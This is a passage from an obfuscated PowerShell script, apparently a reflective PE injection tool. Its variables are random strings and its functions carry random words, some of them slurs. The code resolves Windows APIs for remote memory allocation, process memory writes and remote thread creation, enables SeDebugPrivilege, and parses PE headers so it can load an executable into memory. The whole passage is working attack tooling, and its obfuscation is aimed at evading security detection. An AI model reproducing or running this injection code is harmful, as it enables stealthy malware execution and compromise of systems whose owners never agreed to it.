        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }
    Function supervision
    {
        $ocxmKEPE99 = New-Object System.Object
        
        $ijaHzybX99 = skinheads kernel32.dll VirtualAlloc
        $fGXxhNSR99 = treadled @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $dJAYxCIL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ijaHzybX99, $fGXxhNSR99)
        $ocxmKEPE99 | Add-Member NoteProperty -Name VirtualAlloc -Value $dJAYxCIL99
        
        $rfpsYdlR99 = skinheads kernel32.dll VirtualAllocEx
        $HpJvjAkb99 = treadled @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $MqQOjVnE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($rfpsYdlR99, $HpJvjAkb99)
        $ocxmKEPE99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $MqQOjVnE99
        
        $ZeVZFpGq99 = skinheads msvcrt.dll memcpy
        $cHDUYqYZ99 = treadled @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $lUslTHrN99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZeVZFpGq99, $cHDUYqYZ99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $lUslTHrN99
        
        $BANZbubI99 = skinheads msvcrt.dll memset
        $IejKMpwv99 = treadled @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $OmZYDCUe99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BANZbubI99, $IejKMpwv99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name memset -Value $OmZYDCUe99
        
        $fbxsRYkA99 = skinheads kernel32.dll LoadLibraryA
        $uzXNoiaU99 = treadled @([String]) ([IntPtr])
        $cSfhoKzz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fbxsRYkA99, $uzXNoiaU99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $cSfhoKzz99
        
        $ITUgvcQp99 = skinheads kernel32.dll GetProcAddress
        $GmDVwFuF99 = treadled @([IntPtr], [String]) ([IntPtr])
        $UDEXNGZM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ITUgvcQp99, $GmDVwFuF99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $UDEXNGZM99
        
        $IIsbjAAz99 = skinheads kernel32.dll GetProcAddress
        $pouAkePf99 = treadled @([IntPtr], [IntPtr]) ([IntPtr])
        $DSXcdslE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IIsbjAAz99, $pouAkePf99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $DSXcdslE99
        
        $SvsoaUJz99 = skinheads kernel32.dll VirtualFree
        $QpNRozSP99 = treadled @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $nArWfqhA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SvsoaUJz99, $QpNRozSP99)
        $ocxmKEPE99 | Add-Member NoteProperty -Name VirtualFree -Value $nArWfqhA99
        
        $ZTUSTJiA99 = skinheads kernel32.dll VirtualFreeEx
        $BBXbbltG99 = treadled @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $MdNkYIgK99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZTUSTJiA99, $BBXbbltG99)
        $ocxmKEPE99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $MdNkYIgK99
        
        $bwYYJapp99 = skinheads kernel32.dll VirtualProtect
        $qeCOoiAy99 = treadled @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $XhMinrSQ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bwYYJapp99, $qeCOoiAy99)
        $ocxmKEPE99 | Add-Member NoteProperty -Name VirtualProtect -Value $XhMinrSQ99
        
        $tuRjLTbz99 = skinheads kernel32.dll GetModuleHandleA
        $QZMTlNDI99 = treadled @([String]) ([IntPtr])
        $ZsszVSla99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tuRjLTbz99, $QZMTlNDI99)
        $ocxmKEPE99 | Add-Member NoteProperty -Name GetModuleHandle -Value $ZsszVSla99
        
        $cVQNlanF99 = skinheads kernel32.dll FreeLibrary
        $avhADryC99 = treadled @([IntPtr]) ([Bool])
        $jFvZHYGK99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cVQNlanF99, $avhADryC99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $jFvZHYGK99
        
        $aUywEtek99 = skinheads kernel32.dll OpenProcess
        $TefhLVrH99 = treadled @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $SxAUlclD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($aUywEtek99, $TefhLVrH99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $SxAUlclD99
        
        $QXWMJvOR99 = skinheads kernel32.dll WaitForSingleObject
        $TjfqNfmc99 = treadled @([IntPtr], [UInt32]) ([UInt32])
        $fDJqLWOD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($QXWMJvOR99, $TjfqNfmc99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $fDJqLWOD99
        
        $tiVMGyJl99 = skinheads kernel32.dll WriteProcessMemory
        $DhwaHHjk99 = treadled @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $zbITKmas99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tiVMGyJl99, $DhwaHHjk99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $zbITKmas99
        
        $PmNmDDGA99 = skinheads kernel32.dll ReadProcessMemory
        $pZlnBjXn99 = treadled @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $rlkjQxta99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PmNmDDGA99, $pZlnBjXn99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $rlkjQxta99
        
        $lEvqCrHb99 = skinheads kernel32.dll CreateRemoteThread
        $WybjAzYG99 = treadled @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $puTnjpBH99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lEvqCrHb99, $WybjAzYG99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $puTnjpBH99
        
        $HuiozuuD99 = skinheads kernel32.dll GetExitCodeThread
        $ecyOdtzr99 = treadled @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $XWBuHVHU99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HuiozuuD99, $ecyOdtzr99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $XWBuHVHU99
        
        $RgqZGxjp99 = skinheads Advapi32.dll OpenThreadToken
        $TQiGPauJ99 = treadled @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $LiNZUtuq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RgqZGxjp99, $TQiGPauJ99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $LiNZUtuq99
        
        $SbbolVlA99 = skinheads kernel32.dll GetCurrentThread
        $aAlbvUkp99 = treadled @() ([IntPtr])
        $ZhzMqnOr99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SbbolVlA99, $aAlbvUkp99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $ZhzMqnOr99
        
        $yyvZWOYf99 = skinheads Advapi32.dll AdjustTokenPrivileges
        $lPiyBXME99 = treadled @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $qFrehkXQ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yyvZWOYf99, $lPiyBXME99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $qFrehkXQ99
        
        $FcNaoHfQ99 = skinheads Advapi32.dll LookupPrivilegeValueA
        $xWnvtHLy99 = treadled @([String], [String], [IntPtr]) ([Bool])
        $fiYKwqUx99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FcNaoHfQ99, $xWnvtHLy99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $fiYKwqUx99
        
        $IJQqFirn99 = skinheads Advapi32.dll ImpersonateSelf
        $yzRJGIhS99 = treadled @([Int32]) ([Bool])
        $bfMIhMnS99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IJQqFirn99, $yzRJGIhS99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $bfMIhMnS99
        
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $eDFCTAqs99 = skinheads NtDll.dll NtCreateThreadEx
            $JZEMhppK99 = treadled @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $pPpQNgHx99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($eDFCTAqs99, $JZEMhppK99)
            $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $pPpQNgHx99
        }
        
        $qtnaDoAs99 = skinheads Kernel32.dll IsWow64Process
        $BHwGefyn99 = treadled @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $uInyMlqX99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qtnaDoAs99, $BHwGefyn99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $uInyMlqX99
        
        $jXMSlYzu99 = skinheads Kernel32.dll CreateThread
        $QXpalHqs99 = treadled @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $aBwzJzNS99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($jXMSlYzu99, $QXpalHqs99)
        $ocxmKEPE99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $aBwzJzNS99
    
        $PApRXlXP99 = skinheads kernel32.dll VirtualFree
        $MqysxJcZ99 = treadled @([IntPtr])
        $TZFkbyeP99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PApRXlXP99, $MqysxJcZ99)
        $ocxmKEPE99 | Add-Member NoteProperty -Name LocalFree -Value $TZFkbyeP99
        return $ocxmKEPE99
    }
    Function rapist
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $CZpnqyRA99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $NlAkQxUG99
        )
        
        [Byte[]]$ZBrSOLCe99 = [BitConverter]::GetBytes($CZpnqyRA99)
        [Byte[]]$aIhrnHuf99 = [BitConverter]::GetBytes($NlAkQxUG99)
        [Byte[]]$ZKcoadix99 = [BitConverter]::GetBytes([UInt64]0)
        if ($ZBrSOLCe99.Count -eq $aIhrnHuf99.Count)
        {
            $vfgLkWED99 = 0
            for ($i = 0; $i -lt $ZBrSOLCe99.Count; $i++)
            {
                $Val = $ZBrSOLCe99[$i] - $vfgLkWED99
                if ($Val -lt $aIhrnHuf99[$i])
                {
                    $Val += 256
                    $vfgLkWED99 = 1
                }
                else
                {
                    $vfgLkWED99 = 0
                }
                
                
                [UInt16]$Sum = $Val - $aIhrnHuf99[$i]
                $ZKcoadix99[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($ZKcoadix99, 0)
    }
    
    Function forecastles
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $CZpnqyRA99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $NlAkQxUG99
        )
        
        [Byte[]]$ZBrSOLCe99 = [BitConverter]::GetBytes($CZpnqyRA99)
        [Byte[]]$aIhrnHuf99 = [BitConverter]::GetBytes($NlAkQxUG99)
        [Byte[]]$ZKcoadix99 = [BitConverter]::GetBytes([UInt64]0)
        if ($ZBrSOLCe99.Count -eq $aIhrnHuf99.Count)
        {
            $vfgLkWED99 = 0
            for ($i = 0; $i -lt $ZBrSOLCe99.Count; $i++)
            {
                [UInt16]$Sum = $ZBrSOLCe99[$i] + $aIhrnHuf99[$i] + $vfgLkWED99
                $ZKcoadix99[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $vfgLkWED99 = 1
                }
                else
                {
                    $vfgLkWED99 = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($ZKcoadix99, 0)
    }
    
    Function commandos
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $CZpnqyRA99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $NlAkQxUG99
        )
        
        [Byte[]]$ZBrSOLCe99 = [BitConverter]::GetBytes($CZpnqyRA99)
        [Byte[]]$aIhrnHuf99 = [BitConverter]::GetBytes($NlAkQxUG99)
        if ($ZBrSOLCe99.Count -eq $aIhrnHuf99.Count)
        {
            for ($i = $ZBrSOLCe99.Count-1; $i -ge 0; $i--)
            {
                if ($ZBrSOLCe99[$i] -gt $aIhrnHuf99[$i])
                {
                    return $true
                }
                elseif ($ZBrSOLCe99[$i] -lt $aIhrnHuf99[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    
    Function cratered
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$XbXYmERB99 = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($XbXYmERB99, 0))
    }
    
    
    Function Mormon
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $BYtPotTf99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$Uskaghuk99 = [IntPtr](forecastles ($StartAddress) ($Size))
        
        $FXxAyvSE99 = $PEInfo.EndAddress
        
        if ((commandos ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $BYtPotTf99"
        }
        if ((commandos ($Uskaghuk99) ($FXxAyvSE99)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $BYtPotTf99"
        }
    }
    
    
    Function costarring
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $echyVupw99
        )
    
        for ($DNHchRPR99 = 0; $DNHchRPR99 -lt $Bytes.Length; $DNHchRPR99++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($echyVupw99, $DNHchRPR99, $Bytes[$DNHchRPR99])
        }
    }
    
    Function treadled
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $ELdIUxZk99 = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )
        $cQMpYrst99 = [AppDomain]::CurrentDomain
        $ZuronvlK99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $SHvOrApf99 = $cQMpYrst99.DefineDynamicAssembly($ZuronvlK99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $fVjOuTcg99 = $SHvOrApf99.DefineDynamicModule('InMemoryModule', $false)
        $qmHxnvBU99 = $fVjOuTcg99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $eDGOSmMJ99 = $qmHxnvBU99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ELdIUxZk99)
        $eDGOSmMJ99.SetImplementationFlags('Runtime, Managed')
        $fQEVPvUq99 = $qmHxnvBU99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ELdIUxZk99)
        $fQEVPvUq99.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $qmHxnvBU99.CreateType()
    }
    Function skinheads
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $OKEXNGGo99
        )
        $VCQUJUXs99 = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $XShtvvco99 = $VCQUJUXs99.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $ZsszVSla99 = $XShtvvco99.GetMethod('GetModuleHandle')
        $UDEXNGZM99 = $XShtvvco99.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
        $LhYvYwXQ99 = $ZsszVSla99.Invoke($null, @($Module))
        $xxMQIKia99 = New-Object IntPtr
        $bjGLjGWr99 = New-Object System.Runtime.InteropServices.HandleRef($xxMQIKia99, $LhYvYwXQ99)
        Write-Output $UDEXNGZM99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$bjGLjGWr99, $OKEXNGGo99))
    }
    
    
    Function pestled
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $ocxmKEPE99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $XdmAcKgP99,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$yeVKhDcB99 = $ocxmKEPE99.GetCurrentThread.Invoke()
        if ($yeVKhDcB99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$qGxVeQiQ99 = [IntPtr]::Zero
        [Bool]$RtFnvHTY99 = $ocxmKEPE99.OpenThreadToken.Invoke($yeVKhDcB99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$qGxVeQiQ99)
        if ($RtFnvHTY99 -eq $false)
        {
            $slcEMQJc99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($slcEMQJc99 -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $RtFnvHTY99 = $ocxmKEPE99.ImpersonateSelf.Invoke(3)
                if ($RtFnvHTY99 -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $RtFnvHTY99 = $ocxmKEPE99.OpenThreadToken.Invoke($yeVKhDcB99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$qGxVeQiQ99)
                if ($RtFnvHTY99 -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $slcEMQJc99"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.LUID))
        $RtFnvHTY99 = $ocxmKEPE99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($RtFnvHTY99 -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }
        [UInt32]$CaRamibt99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.TOKEN_PRIVILEGES)
        [IntPtr]$lNAVdPPj99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($CaRamibt99)
        $TuBtySEb99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($lNAVdPPj99, [Type]$XdmAcKgP99.TOKEN_PRIVILEGES)
        $TuBtySEb99.PrivilegeCount = 1
        $TuBtySEb99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$XdmAcKgP99.LUID)
        $TuBtySEb99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TuBtySEb99, $lNAVdPPj99, $true)
        $RtFnvHTY99 = $ocxmKEPE99.AdjustTokenPrivileges.Invoke($qGxVeQiQ99, $false, $lNAVdPPj99, $CaRamibt99, [IntPtr]::Zero, [IntPtr]::Zero)
        $slcEMQJc99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($RtFnvHTY99 -eq $false) -or ($slcEMQJc99 -ne 0))
        {
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lNAVdPPj99)
    }
    
    
    Function firewater
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $sHbeaXaO99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ocRuxzzh99 = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $ocxmKEPE99
        )
        
        [IntPtr]$BgxzZhYA99 = [IntPtr]::Zero
        
        $jXsuRIWk99 = [Environment]::OSVersion.Version
        if (($jXsuRIWk99 -ge (New-Object 'Version' 6,0)) -and ($jXsuRIWk99 -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $YBTdQAgU99= $ocxmKEPE99.NtCreateThreadEx.Invoke([Ref]$BgxzZhYA99, 0x1FFFFF, [IntPtr]::Zero, $sHbeaXaO99, $StartAddress, $ocRuxzzh99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $nVPMnute99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($BgxzZhYA99 -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $YBTdQAgU99. LastError: $nVPMnute99"
            }
        }
        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $BgxzZhYA99 = $ocxmKEPE99.CreateRemoteThread.Invoke($sHbeaXaO99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ocRuxzzh99, 0, [IntPtr]::Zero)
        }
        
        if ($BgxzZhYA99 -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }
        
        return $BgxzZhYA99
    }
    
    Function iced
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $IzMDqdqW99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $XdmAcKgP99
        )
        
        $pSSMvuZf99 = New-Object System.Object
        
        $CquSPTlZ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IzMDqdqW99, [Type]$XdmAcKgP99.IMAGE_DOS_HEADER)
        [IntPtr]$tLtHmpgb99 = [IntPtr](forecastles ([Int64]$IzMDqdqW99) ([Int64][UInt64]$CquSPTlZ99.e_lfanew))
        $pSSMvuZf99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $tLtHmpgb99
        $RwknkHMa99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tLtHmpgb99, [Type]$XdmAcKgP99.IMAGE_NT_HEADERS64)
        
        if ($RwknkHMa99.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($RwknkHMa99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $pSSMvuZf99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $RwknkHMa99
            $pSSMvuZf99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $grBpohdo99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tLtHmpgb99, [Type]$XdmAcKgP99.IMAGE_NT_HEADERS32)
            $pSSMvuZf99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $grBpohdo99
            $pSSMvuZf99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $pSSMvuZf99
    }
    Function unattached
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $VPcmXnGz99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $XdmAcKgP99
        )
        
        $PEInfo = New-Object System.Object
        
        [IntPtr]$UTKaacpq99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VPcmXnGz99.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($VPcmXnGz99, 0, $UTKaacpq99, $VPcmXnGz99.Length) | Out-Null
        
        $pSSMvuZf99 = iced -IzMDqdqW99 $UTKaacpq99 -XdmAcKgP99 $XdmAcKgP99
        
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($pSSMvuZf99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($pSSMvuZf99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($pSSMvuZf99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($pSSMvuZf99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($pSSMvuZf99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UTKaacpq99)
        
        return $PEInfo
    }
    Function guesstimating
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $IzMDqdqW99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $XdmAcKgP99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($IzMDqdqW99 -eq $null -or $IzMDqdqW99 -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
